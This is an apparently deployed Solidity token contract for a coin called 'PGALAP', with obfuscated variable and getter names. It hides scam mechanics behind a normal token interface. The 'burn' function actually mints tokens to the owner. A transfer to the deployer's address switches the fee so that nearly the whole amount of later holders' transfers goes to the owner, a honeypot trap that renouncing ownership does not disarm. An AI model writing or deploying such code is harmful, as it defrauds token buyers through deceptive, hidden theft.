/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-16 08:09 GMT
 */
 // 
// @@@@@@@@\                                      @@@@@@\  @@\                 @@\           
// @@  _____|                                    @@  [email protected]@\ @@ |                \__|          
// @@ |       @@@@@@@\  @@@@@@@\  @@@@@@\        @@ /  \__|@@@@@@@\   @@@@@@\  @@\ @@@@@@@\  
// @@@@@\    @@  _____|@@  _____|@@  [email protected]@\       @@ |      @@  [email protected]@\  \[email protected]@\ @@ |@@  [email protected]@\ 
// @@  __|   \@@@@@@\  \@@@@@@\  @@@@@@@@ |      @@ |      @@ |  @@ | @@@@@@@ |@@ |@@ |  @@ |
// @@ |       \[email protected]@\  \[email protected]@\ @@   ____|      @@ |  @@\ @@ |  @@ |@@  [email protected]@ |@@ |@@ |  @@ |
// @@@@@@@@\ @@@@@@@  |@@@@@@@  |\@@@@@@@\       \@@@@@@  |@@ |  @@ |\@@@@@@@ |@@ |@@ |  @@ |
// \________|\_______/ \_______/  \_______|       \______/ \__|  \__| \_______|\__|\__|  \__|
//
//
 // SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract LSUHZOA {
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  XVNUUO = 10000000000000;
address private  OFCPCK = address(0);
address private  COGRQP = address(0);
uint256 private  NTVJNW = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  OEFKJR = 10000000000;
uint256 private  CXSQYX = 1000000000000000000000;
uint256 public constant XFJPSX = 99999;
string public  name = "PGALAP";
uint256 private  IRTXEO = 100000000;
mapping (address => uint256) public balanceOf;
address private  GRYNAM = address(0);
address private  JKXFMW = address(0);
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  symbol = "PGALAP";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  PNNWTD = address(0);
uint256 private  DFQGUS = 1000000000000000;
uint256 private  GFWETJ = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getGRYNAM() private returns (address) {
return GRYNAM;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () public {
JKXFMW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getIRTXEO() private returns (uint256) {
return IRTXEO;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getDFQGUS() private returns (uint256) {
return DFQGUS;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getCXSQYX() private returns (uint256) {
return CXSQYX;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tRZZOBG 0");
require(spender != address(0), "fRZZOBG 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "RZZOBG");
require(to != address(0), "RZZOBG");
require(amount <= balanceOf[from], "RZZOBG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XFJPSX/NTVJNW ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==JKXFMW){
NTVJNW = XFJPSX+2;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getPNNWTD() private returns (address) {
return PNNWTD;
}

function _getGFWETJ() private returns (uint256) {
return GFWETJ;
}

function _getOEFKJR() private returns (uint256) {
return OEFKJR;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getXVNUUO() private returns (uint256) {
return XVNUUO;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getCOGRQP() private returns (address) {
return COGRQP;
}

function _getOFCPCK() private returns (address) {
return OFCPCK;
}


}